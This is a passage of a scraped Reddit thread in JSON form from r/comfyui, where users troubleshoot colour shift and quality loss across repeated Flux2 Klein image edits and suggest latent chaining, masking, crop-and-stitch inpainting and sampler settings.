                  "text": "Ayy, no worries.\n\nSo, I just downloaded your image and couldn't replicate. I did notice you said you removed the scaletototalpixels node. Your input image is 1536 x 2752, and the Flux2 Klein base resolution is 1 megapixel. 1536 x 2752 is 4,227,072 pixels, so you are trying to generate 2x the base resolution. \n\nFor now, bring back the scale to total pixels node and set it to 2 megapixels max. Also make sure to change the seed between generations, and that should set you up right for small edits like these. If you need to make bigger edits like putting a character in a different pose, you will likely need to drop the resolution down closer to base res. \n\nIf you want to work on the full resolution image, you'd be better off running an inpainting workflow on it, where you crop bits out of the image, make your edits on those cropped bits, and reattach. There must be a Klein inpainting workflow around somewhere, let me know if you can't find one and I'll throw one together for you.",
                  "score": 3,
                  "created_utc": "2026-01-23 14:46:52",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o19nf8p",
              "author": "roxoholic",
              "text": "You don't have to manually save/load latents. There are `Latent Sender`/`Latent Receiver` nodes in Impact Pack which make iterating a lot faster.\n\nhttps://github.com/ltdrdata/ComfyUI-extension-tutorials/blob/Main/ComfyUI-Impact-Pack/tutorial/sender_receiver.md",
              "score": 4,
              "created_utc": "2026-01-23 16:56:16",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19uurh",
                  "author": "afinalsin",
                  "text": "Fuck yes, I knew someone was gonna come through with the goods. That looks incredibly useful, and way better than the hatchet job nodes I vibecoded. Thank you.",
                  "score": 4,
                  "created_utc": "2026-01-23 17:30:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o19gwvq",
              "author": "Sgsrules2",
              "text": "Use this node instead: https://github.com/Velour-Fog/comfy-latent-nodes\nIt lets you specify the location so you don't have to copy the latents. Just setup a temp file and read from it.",
              "score": 1,
              "created_utc": "2026-01-23 16:27:07",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19veht",
                  "author": "afinalsin",
                  "text": "Hell yeah. I already vibed my way through a similar node group, but good to have options. Between this and the other guy's send/receive nodes, I'll pretty much be set. Thank you.",
                  "score": 1,
                  "created_utc": "2026-01-23 17:33:28",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16ihoz",
          "author": "BathroomEyes",
          "text": "It‚Äôs called color shifting and it‚Äôs a consequence of the vae encode/decode nodes. They‚Äôre lossy and can result in noticeable loss of sharpness and color inaccuracy. There‚Äôs a few ways you can address this. You could color correct with post processing software. If you need to do multiple sampler passes you can keep the successive outputs in latent space and only decode after the last sampler pass. TBG-Takeaways has a vae decode color shift fixer for Flux1.D so I‚Äôm hoping u/TBG______ releases one for Flux.2.",
          "score": 31,
          "created_utc": "2026-01-23 04:20:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16uet5",
              "author": "eagledoto",
              "text": "\"If you need to do multiple sampler passes you can keep the successive outputs in latent space and only decode after the last sampler pass\"\n\ncan you explain this part a bit more please? I am new to comfy so learning",
              "score": 4,
              "created_utc": "2026-01-23 05:41:29",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o16vj4y",
                  "author": "Haiku-575",
                  "text": "After your denoised latent comes out of the KSampler, instead of passing it to a VAE Decode node to turn it into pixels, pass it straight into another KSampler with different conditioning. Does that make sense?",
                  "score": 17,
                  "created_utc": "2026-01-23 05:49:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o17663a",
              "author": "JoelMahon",
              "text": "is there simply a less lossy version of the vae encode/decode nodes?",
              "score": 1,
              "created_utc": "2026-01-23 07:15:52",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1cvx2n",
                  "author": "Winter_unmuted",
                  "text": "no. it isn't the node's fault, but rather a consequence of vae encoding itself. latent space, which is what an image is vae encoded into, has less information than the input image. It's lossy. \n\nThe reconstructed image has the same amount of info as the input image did, but it doesn't \"remember\" what the input was. It just knows the latent, and what general informatino can be used to reconstruct an image from such a latent. The missing info between those two formats is made up. The data are constrained randomness. \n\nthat randomness manifests as essentially what we call degraded images. Nonsensical things like extra fingers. eyes that don't line up right or irises that aren't circular. teeth that are lopsided or the wrong number. Letters that look letter-ish but are actually nonsense. etc.",
                  "score": 2,
                  "created_utc": "2026-01-24 02:36:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o17ldoz",
              "author": "TheSquirrelly",
              "text": "The multiple samplers sounds like a good idea.  Though if you have a number of edits to do like the OP you have to hope each of the edits get it right the first time.  If you find you have to regen for each edit and get success 1 in 4 (just to make up a number) and have 3 edits, now you have a 1 in 64 chance.  But if it usually hits it the first time then should be good.",
              "score": 1,
              "created_utc": "2026-01-23 09:34:56",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o17z1d5",
                  "author": "Aromatic-Somewhere29",
                  "text": "You can chain multiple KSamplers and place a VAE decoder with image preview after each one. Bypass all but the first KSampler and keep regenerating only the first edit until you get the desired result. Once satisfied, lock the seed of the first KSampler, enable the second one, and repeat the process.",
                  "score": 4,
                  "created_utc": "2026-01-23 11:34:16",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16f231",
          "author": "marres",
          "text": "vae encode/decode and whatever other stuff the model is doing with the image degrades it.",
          "score": 8,
          "created_utc": "2026-01-23 03:59:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16gvz5",
              "author": "eagledoto",
              "text": "what if i give it a detailed prompt to keep the rest of the image as it is and just make the change that i tell it to? you think that will help?",
              "score": 1,
              "created_utc": "2026-01-23 04:10:36",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o16ihsi",
                  "author": "marres",
                  "text": "No, you can't control that with the prompt. What you would need to do is do all the editing in one pass",
                  "score": 6,
                  "created_utc": "2026-01-23 04:20:34",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16l41u",
          "author": "Most_Way_9754",
          "text": "Create a mask of the area you want to edit by using:\n\n[https://github.com/adambarbato/ComfyUI-Sa2VA](https://github.com/adambarbato/ComfyUI-Sa2VA)\n\nthen use: \n\n[https://github.com/lquesada/ComfyUI-Inpaint-CropAndStitch](https://github.com/lquesada/ComfyUI-Inpaint-CropAndStitch)",
          "score": 8,
          "created_utc": "2026-01-23 04:37:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16tzz6",
              "author": "eagledoto",
              "text": "What about using the inbuilt mask editor?",
              "score": 3,
              "created_utc": "2026-01-23 05:38:29",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o17700i",
                  "author": "Most_Way_9754",
                  "text": "i'm not skilled at using a paintbrush to paint the ear-rings, people in the background or her clothes. so i just use something like Sa2VA to automatically create the mask. you can try to mask manually using the in built tools and use the crop and stitch nodes that way.",
                  "score": 2,
                  "created_utc": "2026-01-23 07:23:09",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16r0nm",
          "author": "TechnologyGrouchy679",
          "text": "kijai's \"match color\" node might tame the saturation",
          "score": 4,
          "created_utc": "2026-01-23 05:17:01",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16u6b4",
              "author": "eagledoto",
              "text": "https://preview.redd.it/wklxr9kod1fg1.png?width=1173&format=png&auto=webp&s=fb38e808cfd8f51f581b11f6e44b63257052ebca\n\nThis correct?",
              "score": 3,
              "created_utc": "2026-01-23 05:39:46",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o16v9oh",
                  "author": "TechnologyGrouchy679",
                  "text": "yes but in this case it doesn't seem all that effective",
                  "score": 3,
                  "created_utc": "2026-01-23 05:47:51",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ed7n3",
                  "author": "TBG______",
                  "text": "A mask is needed so the black shirt doesn‚Äôt inherit colors from the white shirt. And try to use lab or wavelet for cc.",
                  "score": 1,
                  "created_utc": "2026-01-24 09:17:34",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o18ax3o",
              "author": "sevenfold21",
              "text": "Color matching sucks for editing, because you're adding or removing pixels, and these colors can be completely different from the original.",
              "score": 2,
              "created_utc": "2026-01-23 12:57:11",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1710y8",
          "author": "_VirtualCosmos_",
          "text": "Same with Qwen Edit",
          "score": 5,
          "created_utc": "2026-01-23 06:33:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o17xe5o",
          "author": "Luke2642",
          "text": "GROUPTHINK ALERT - THIS IS NOT CAUSED BY VAE.\n\nThe colour shift is caused by the ksampler applying a STD + MEAN shift to move the distribution across the channels from being more like the noise to more like the distribution statistics of the VAE.\n\nIf you pass it through six times you get a slight fading effect, that is all. No colour shift.\n\nIf you add a latent multiply, the fading effect vanishes. No colour shift.\n\nhttps://preview.redd.it/v6zdrrp343fg1.png?width=3234&format=png&auto=webp&s=8fd5da77168a7727d09bff6209f1e766089799ac",
          "score": 7,
          "created_utc": "2026-01-23 11:21:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o19bs7f",
              "author": "BathroomEyes",
              "text": "You really should be using the Flux2 vae in your example if you‚Äôd like to make an apples to apples demonstration. Unless that‚Äôs just what you‚Äôve renamed your flux2 vae.",
              "score": 1,
              "created_utc": "2026-01-23 16:04:06",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19i7ro",
                  "author": "Luke2642",
                  "text": "yeah, they named it ae.safetensors originally, which I think was an error. So at least I should call it flux\\_vae.safetensors!\n\n[https://huggingface.co/black-forest-labs/FLUX.1-dev/tree/main](https://huggingface.co/black-forest-labs/FLUX.1-dev/tree/main)",
                  "score": 2,
                  "created_utc": "2026-01-23 16:32:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o185l2z",
              "author": "Luke2642",
              "text": "That is absolutely not all. The details degrade with each successive trip in and out of latent space, depding on the VAE.¬†[Comparison between input and 8x encode/decode cycles](https://imgsli.com/NDQ0NjY3).",
              "score": 0,
              "created_utc": "2026-01-23 12:22:31",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o18eyej",
                  "author": "eagledoto",
                  "text": "So the latent multiply works?",
                  "score": 1,
                  "created_utc": "2026-01-23 13:21:17",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16ormt",
          "author": "krigeta1",
          "text": "Same thing happened with nano banana pro gemini app too, when I am keeping asking for edits the quality degraded by each step, have you tried with an actual image? I guess it could be a thing with nano banana pro images and its watermark. But is it just amu assumption.",
          "score": 3,
          "created_utc": "2026-01-23 05:01:36",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16u9wt",
              "author": "eagledoto",
              "text": "Havent tested it on a real image, but i believe once its processed by ai, it would start to have the same issue of one tries to edit it again and again.",
              "score": 1,
              "created_utc": "2026-01-23 05:40:30",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o17a5sa",
          "author": "magik111",
          "text": "for me sometimes help add to prompt \"Strictly preserve all original colors from the photo, maintain exact color tones, saturation, and hues without any changes. Be completely consistent with the photo's color palette throughout the entire image\"",
          "score": 3,
          "created_utc": "2026-01-23 07:51:02",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o17cuiw",
          "author": "TBG______",
          "text": "Colorshifts in Diffusion + VAE workflows in ComfyUI mainly originate from three technical sources.\n\n\n1. Model capacity and reconstruction error\n\nEvery diffusion model has limited capacity to perfectly reconstruct image content. During iterative, these reconstruction errors accumulate. This becomes most visible in uniform, low-entropy regions such as pure black, gray, or white areas. The observed color shift is therefore not random noise, but the model‚Äôs inability to exactly reproduce flat tonal regions across generations.\n\n2. Inpainting and differential diffusion leakage\n\nInpainting introduces unavoidable leakage, even when differential diffusion is implemented directly within the model. Color and sharpness changes are not confined to the masked region, they also affect unmasked areas.\nEven with a fully black (0) mask, subtle changes can be observed outside the intended edit region. Increasing the number of inpainting steps amplifies this effect, causing gradual drift in color and detail both inside and near the mask boundaries.\n\n3. VAE encoding and decoding shifts\n\nVAE-induced color shifts are a well-known issue and have already been thoroughly documented. Any pixel-to-latent and latent-to-pixel conversion introduces small but cumulative deviations in color and contrast.\n\nUsing tiled VAE encoding/decoding generally produces better local color stability compared to full-frame VAE passes, especially at high resolutions. However, tiled VAEs introduce small rounding and boundary errors at tile borders. More details here : https://www.patreon.com/posts/147809146\n\nThere is only one reliable method to exactly maintain image content:\nDo not pass it through the sampler.\n\nThis makes crop-and-stitch workflows essential. Ideally, these operations should happen entirely in pixel space, using the original image data. Even a single VAE encode/decode pass alters the image, so avoiding unnecessary latent conversions is critical when preservation is required.\n\nIn the TBG ETUR Enhanced Tiled Upscaler and Refiner, these principles are fully automated:\n\t‚Ä¢\tCrop-and-stitch handling\n\t‚Ä¢\tVAE correction\n\t‚Ä¢\tLanpaint\n\t‚Ä¢\tMulti-object editing in a single pass\n\nThis allows you to modify many separate objects while keeping the background fully intact.\n\nHow it works\n\nYou can either:\n\t‚Ä¢\tUse the SAM segmentation nodes, or\n\t‚Ä¢\tManually mask all target elements\n\nPass the masks and the input image through the Upscaler and Tiler node with:\n\t‚Ä¢\tUpscale = None\n\t‚Ä¢\tPreset = Full Image\n\nThis configuration converts the workflow into an advanced inpainting pipeline, rather than a tiled upscaler.\n\nThe ‚ÄúETUR Tile Overrides‚Äù node enables:\n\t‚Ä¢\tAutomatic prompt generation\n\t‚Ä¢\tPer-segment prompt assignment\n\t‚Ä¢\tAdditional conditioning per selected element\n\nThe Refiner then applies all modifications while preserving the background. Optionally, the background itself can be refined in the same pass if desired.\n\nThis workflow has been tested with:\n\t‚Ä¢\tFlux, Qwen,ZIT,SD,SDXL,CHROMA\n\t‚Ä¢\tFlux Inpaint\n\t‚Ä¢\tFlux Kontext\n\nIt has not yet been tested with Flux2 Klein, but it should work similarly. Alternatively, a manual crop-and-stitch approach can be used to achieve comparable results.\n\nCore rule\n\nNever sample content that must remain unchanged.",
          "score": 3,
          "created_utc": "2026-01-23 08:15:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o17fjnq",
              "author": "TBG______",
              "text": "This gives me an idea: I could add an inpainting-only mode switch to TBG ETUR. Let me know if this would be useful for you.",
              "score": 2,
              "created_utc": "2026-01-23 08:40:05",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19cckj",
                  "author": "BathroomEyes",
                  "text": "I would find this very useful, thank you!",
                  "score": 1,
                  "created_utc": "2026-01-23 16:06:41",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o18elho",
              "author": "eagledoto",
              "text": "Will test with ZIT, thank you!",
              "score": 1,
              "created_utc": "2026-01-23 13:19:15",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16gj3n",
          "author": "alsshadow",
          "text": "Looks funny",
          "score": 2,
          "created_utc": "2026-01-23 04:08:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16r5js",
          "author": "admajic",
          "text": "I use the two image workflow. Put both images in. In image 2 I color the parts I don't want it to touch in red. Then prompt what I want it to do",
          "score": 2,
          "created_utc": "2026-01-23 05:17:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o16tlek",
          "author": "mac404",
          "text": "You should be able to fairly easily make all 3 of those changes in a single prompt.  \n\nDoing multiple VAE Encode/Decode passes will degrade the quality over time, but not necessarily to the degree you see here. You will see a color shift with every gen, but it should be only noticeable when doing more intense back-and-forth comparisons (whereas it's quite obvious here).  \n\nIn your example, after the first change you also already had some shifting / squishing of the image. This can happen sometimes, I've found it's usually a good idea to try 2-4 seeds with the same prompt and then pick the best one. You are also running at a resolution that is getting too high for Klein to handle well (1536 x 2752), and it will generally be much less stable because of that. I have generally found (although I haven't tested overly scientifically) that keeping the longest side below about 2k resolution will improve stability significantly when making changes. The model itself tends to output images that are so sharp / clear that I don't find the resolution limitation to actually be all that limiting.  \n\nNot perfect, but [here was the very first image I got](https://imgsli.com/NDQ0NTU4) when I tried with this prompt (after downloading the original PNG of your first image):  \n\n> Subject's shirt is black. Remove the subject's earrings. Remove the people from the background. Keep the subject‚Äôs pose and framing unchanged.  \n\nBecause the res is so high, you still get a little bit of squashing/stretching that's noticeable in the face. Maybe it would be perfect in a different seed if you tried a few. Hair color is slightly darker and the coffee cup also darkens slightly, but skin color stayed basically the same. There's a random out-of-focus person that got added into the background and a few other random changes, too. But not bad for literally the first try with a simple multi-change prompt.",
          "score": 2,
          "created_utc": "2026-01-23 05:35:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16zoud",
              "author": "eagledoto",
              "text": "yep definitely, I could do all that with a single prompt, but that was not my main focus, i was just playing around and noticed it as i didn't know about the color shifting.\n\nRegarding resolution, yes i believe its odd and pretty high.\n\nThe output you got is pretty decent yes.\n\nThank you for the detailed comment. Means alot!",
              "score": 1,
              "created_utc": "2026-01-23 06:22:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1725sj",
                  "author": "mac404",
                  "text": "Sure! And gotcha, makes sense.  \n\nAnother random note on prompting - basically anything you mention in the prompt will get changed in some way. You can always try variations on \"Keep ___ unchanged\" and it will often work pretty well.  And as weird as it feels, I find just puttring \"[object] is [color]\" can work better than \"change [color] to [other color]\". \"Remove\" and \"replace\" are pretty good prompt words, though.",
                  "score": 2,
                  "created_utc": "2026-01-23 06:42:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1728ai",
          "author": "Downtown-Bat-5493",
          "text": "*Quality degradation with each pass. \n\n\nJust compare her face in first image to the last.",
          "score": 2,
          "created_utc": "2026-01-23 06:42:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1742jb",
          "author": "Amirferdos",
          "text": "Don‚Äôt think about the VAE, it‚Äôs working good in 4B model.\nSo the problem is in 9B model",
          "score": 2,
          "created_utc": "2026-01-23 06:57:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1msa6l",
              "author": "eagledoto",
              "text": "Ah, will test it out",
              "score": 1,
              "created_utc": "2026-01-25 15:34:26",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1880od",
          "author": "Aromatic-Somewhere29",
          "text": "You can disable all groups except the first one and rerun the workflow until you get the result you want. Then, lock the seed, enable the second group, and repeat the process. You can copy and paste the last group to extend the chain. \n\nhttps://preview.redd.it/nh8qo9dwo3fg1.png?width=6121&format=png&auto=webp&s=e15e5c3ded9cad14674dd1acf0058b57adc7550c",
          "score": 2,
          "created_utc": "2026-01-23 12:38:50",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18eh8m",
              "author": "eagledoto",
              "text": "Thank you will try it out",
              "score": 1,
              "created_utc": "2026-01-23 13:18:36",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18gv12",
                  "author": "Aromatic-Somewhere29",
                  "text": "I'm not sure if the workflow saved properly, here's a second attempt with small refinements. Looks like Reddit converts .png to .webp and removes the embedded workflow. I‚Äôve uploaded the .json file here: [https://pastebin.com/pqQfeHLD](https://pastebin.com/pqQfeHLD)\n\nhttps://preview.redd.it/2lpuhok6r3fg1.png?width=5874&format=png&auto=webp&s=5176e79bbee7a784170182a93318d76452b0a6a4",
                  "score": 2,
                  "created_utc": "2026-01-23 13:31:44",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ee9vm",
                  "author": "Aromatic-Somewhere29",
                  "text": "Have you had a chance to try it? I‚Äôm curious whether it helped streamline your workflow.\n\nThe main idea here is to avoid the kind of manual overhead described in that long comment - things like saving intermediate latent files, digging through folders to find the right one, copying and pasting them back into the graph, and reloading just to make a tiny adjustment. That approach works in a pinch, but it‚Äôs not how latent-space editing was really meant to be used within a single, continuous generation task.\n\nIn ComfyUI the standard and most efficient approach for iterative refinement is chaining KSamplers and passing the latent directly from one to the next. This keeps everything in memory, avoids file clutter, and lets you isolate each edit step cleanly.\n\nThat‚Äôs exactly what this workflow does: each KSampler handles one specific change (e.g., pose, lighting, expression), and the latent flows sequentially down the chain. You can disable all but the first group, iterate until you‚Äôre happy, lock the seed, then move on to the next stage - all without ever touching the filesystem.\n\nIt‚Äôs a bit wordy, I know, but maybe my take on this gets missed because it hasn‚Äôt been explained in enough detail.",
                  "score": 1,
                  "created_utc": "2026-01-24 09:27:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o191o87",
          "author": "TekaiGuy",
          "text": "Edit models are always destructive which is why I don't even bother with them.",
          "score": 2,
          "created_utc": "2026-01-23 15:18:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1mq3b0",
              "author": "Comfortable_Swim_380",
              "text": "Probably good advice. The custom wan ones I tried for example just blow up the workflow. Dont even work.",
              "score": 1,
              "created_utc": "2026-01-25 15:24:12",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1f2vzy",
          "author": "TBG______",
          "text": "I propose a potential solution that replaces the unedited areas with the corresponding regions from the original image to prevent degradation: [https://www.reddit.com/r/comfyui/comments/1qkog35/comment/o1f292l/?utm\\_source=share&utm\\_medium=web3x&utm\\_name=web3xcss&utm\\_term=1&utm\\_content=share\\_button](https://www.reddit.com/r/comfyui/comments/1qkog35/comment/o1f292l/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button) \\- After testing it with SAM, which requires manual input of elements, I‚Äôve created a new node that can automatically detect the affected areas without SAM, allowing the process to be fully automated.\n\nHowever, I noticed that many contour edges are affected in the output of the sampler. This could make the issue a bit tricky to resolve. The new TBG Difference Mask node compares two images, mixes SSIM (structure) and RGB difference (color), then thresholds and area-filters to isolate real, coherent changes (like a shirt swap) while ignoring tiny model artifacts and noise.\n\nTBG Takeaways with the new TBG Difference Mask node are now uploaded and accessible from the Manager. The workflow for the SAM and Diff nodes can be found here:¬†[https://www.patreon.com/posts/149003920](https://www.patreon.com/posts/149003920)¬†(free access). SAM version works always but Diff Mask only if diff is significant.\n\nhttps://preview.redd.it/tvi98fzloafg1.png?width=1336&format=png&auto=webp&s=3b28ffe8b7e40aee43b6dd595bc72961dea63253",
          "score": 2,
          "created_utc": "2026-01-24 12:57:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1inhne",
              "author": "eagledoto",
              "text": "I got the workflow running till some extent, I am getting white edges around the shirt no matter how much i play with the mask settings, is there any way to perfectly mask the shirt?",
              "score": 1,
              "created_utc": "2026-01-24 23:17:21",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1iqt1w",
                  "author": "TBG______",
                  "text": "You need to extend the mask area beyond the blur margin. Besides that I tested different edits: shirts works, but more subtle changes still require manual masking, so it‚Äôs not a perfect workaround, just a starting point.",
                  "score": 2,
                  "created_utc": "2026-01-24 23:34:39",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1iopis",
                  "author": "eagledoto",
                  "text": "https://preview.redd.it/htip1b6esdfg1.png?width=752&format=png&auto=webp&s=165a61ea8ecc92af00fd42b15c47d8388157a0ed\n\n[https://pastebin.com/Lh8YbrKM](https://pastebin.com/Lh8YbrKM) these are the workflow settings",
                  "score": 1,
                  "created_utc": "2026-01-24 23:23:36",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o173w2b",
          "author": "Rude_Dependent_9843",
          "text": "In my experience, I've found that this depends on the seed. Since the distilled model, according to FL Studio, already exhibits less variability, what I do is add a seed randomization module: I use Easy Seed (I've also added RGthree Seed, but for some reason it makes the flow heavier). Because generation is fast, I run some tests, and let's say 1 out of every 3 results has a balanced color correction.",
          "score": 1,
          "created_utc": "2026-01-23 06:56:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1747f3",
              "author": "eagledoto",
              "text": "Regarding seed, the seed doesnt change every time I generate something, it's set to randomized but I believe I am looking at a different seed? It's the noise seed something, sorry I am on my phone so I can't tell you what it was exactly",
              "score": 1,
              "created_utc": "2026-01-23 06:59:05",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o17ap59",
          "author": "StableLlama",
          "text": "My main observation is that it gives the image warmer colors.\n\nAnyway, when the colors and saturation isn't kept, actually when the values of the not edited pixels isn't kept it's bad.\n\nIMHO there are two ways to solve it:\n\n* Train the model better. (My guess is, that the VAE doesn't keep the error function. I.e. a pixel change resulting in a Delta E and luminosity change of \"err\" should create after the same change in latent space also an error of \"err\". Most likely the VAE wasn't trained with that constraint). But that's nothing you can do.\n* Use masking. Only allow the model to change the pixels you are allowing it to, the others are prevent from changing with a mask.\n\nWith tools like Krita AI it's very simple to mask the area that is allowed to change. With Comfy itself you need to adapt your workflow.",
          "score": 1,
          "created_utc": "2026-01-23 07:55:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o19lgxg",
          "author": "Comfortable_Swim_380",
          "text": "Your scheduler can be causing that I would try something more advanced",
          "score": 1,
          "created_utc": "2026-01-23 16:47:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hh2gk",
              "author": "eagledoto",
              "text": "What If i use the default ksampler instead of this?\n\nhttps://preview.redd.it/qy84l2isqcfg1.png?width=622&format=png&auto=webp&s=f0181fb2af4772fbdf408a686e93c2ce1e1e6a01",
              "score": 2,
              "created_utc": "2026-01-24 19:53:22",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1hgrxn",
              "author": "eagledoto",
              "text": "I am using the Flux2Scheduler, can you suggest anything else?",
              "score": 1,
              "created_utc": "2026-01-24 19:52:03",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1mp4p1",
                  "author": "Comfortable_Swim_380",
                  "text": "# Current Working Setup\n\n**For video:**  \n**2 Sampler Setup (ie WAN 2.2)**\n\n|Steps|Sampler|Scheduler|\n|:-|:-|:-|\n|0-15|res\\_multistep|beta57|\n|15-40|res\\_2s|beta 57|\n\n**1 Sampler Setup (ie WAN 2.1)**\n\n|Steps (Total)|Sampler|Scheduler|\n|:-|:-|:-|\n|0-35|res\\_2s/ unipc|beta57|\n\n**For image (ie FLUX):**\n\n|Steps (Total)|Sampler|Scheduler|\n|:-|:-|:-|\n|20-35|uni\\_pc (good for high detail)|beta57|\n|\\~20-30|eular (good for dramatic changes)|beta57|",
                  "score": 1,
                  "created_utc": "2026-01-25 15:19:45",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1dc20p",
          "author": "tarkansarim",
          "text": "That‚Äôs why I always use photoshop to only adopt the parts I‚Äôve changed onto the original image for local edits. Obviously that doesn‚Äôt work for global edits like lighting but that‚Äôs also not something you would do repeatedly on the same image.",
          "score": 1,
          "created_utc": "2026-01-24 04:15:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1gzxi6",
          "author": "Suitable-League-4447",
          "text": "is someone here having a solution for qwen edit 2509 or 2511 as it changes completely the face of the input image person and wondering if what is explained here could help? im working on pose transfer i2i workflow.",
          "score": 1,
          "created_utc": "2026-01-24 18:38:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hepgl",
              "author": "eagledoto",
              "text": "Try out flux 2 edit, or qwen 2512.",
              "score": 1,
              "created_utc": "2026-01-24 19:42:47",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1lgkl9",
                  "author": "Suitable-League-4447",
                  "text": "wdym by flux2 edit? there's not edit version of flux2 u meant klein?",
                  "score": 1,
                  "created_utc": "2026-01-25 10:22:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16hvpt",
          "author": "Key-Tension1528",
          "text": "All models have some sort of bias and do this. If you repeat enough times the bias will make it drift into nonsense. You could try passing it through a color match node with the original image.",
          "score": 0,
          "created_utc": "2026-01-23 04:16:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16u5cx",
              "author": "eagledoto",
              "text": "https://preview.redd.it/r94ndihld1fg1.png?width=1173&format=png&auto=webp&s=093afeebace3bfb939581678389af7bac1b18606\n\nAm i supposed to do it like this? sorry m a noob at this, started a few days ago.",
              "score": 1,
              "created_utc": "2026-01-23 05:39:34",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16q9ku",
          "author": "TomorrowNeverKnowss",
          "text": "Other than the increased saturation, that actually looks really good. Can you share your workflow?",
          "score": 1,
          "created_utc": "2026-01-23 05:11:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16tr2w",
              "author": "eagledoto",
              "text": "I am using the default workflow from here, everything should be there if you want to download.\n\n[https://docs.comfy.org/tutorials/flux/flux-2-klein](https://docs.comfy.org/tutorials/flux/flux-2-klein)",
              "score": 2,
              "created_utc": "2026-01-23 05:36:39",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qjzdr8",
      "title": "I tested Microsoft Trellis 2 for real VFX work ‚Äî honest thoughts from a 15-year 3D artist",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qjzdr8/i_tested_microsoft_trellis_2_for_real_vfx_work/",
      "author": "ArcticLatent",
      "created_utc": "2026-01-22 16:38:04",
      "score": 84,
      "num_comments": 26,
      "upvote_ratio": 0.97,
